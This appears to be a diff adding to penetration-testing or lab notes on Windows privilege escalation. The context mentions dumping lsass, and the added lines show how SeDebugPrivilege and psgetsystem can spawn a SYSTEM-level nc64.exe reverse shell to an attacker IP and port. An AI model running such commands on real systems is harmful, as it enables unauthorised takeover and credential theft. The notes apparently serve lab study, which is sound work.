@@ -68,6 +68,12 @@ Opening : 'lsass.dmp' file for minidump...
 ```
 
 We can also archive RCE with SeDebugPrivilege, using https://github.com/decoder-it/psgetsystem, we first find process PID which is run as NT AUTHORITY\SYSTEM, then we can input command and args, this would allow us to run command as SYSTEM, we could use it to spawn a cmd (start cmd) or execute other code
+```
+Example: (assuming PID of 552)
+import-module .\psgetsys.ps1
+ImpersonateFromParentPid -ppid 552 -command "c:\windows\system32\cmd.exe" -cmdargs "/c
+c:\users\alaading\music\nc64.exe 10.10.14.100 9001 -e powershell"
+```
 
 Privilege Escalation with SeTakeOwnershipPrivilege:
 
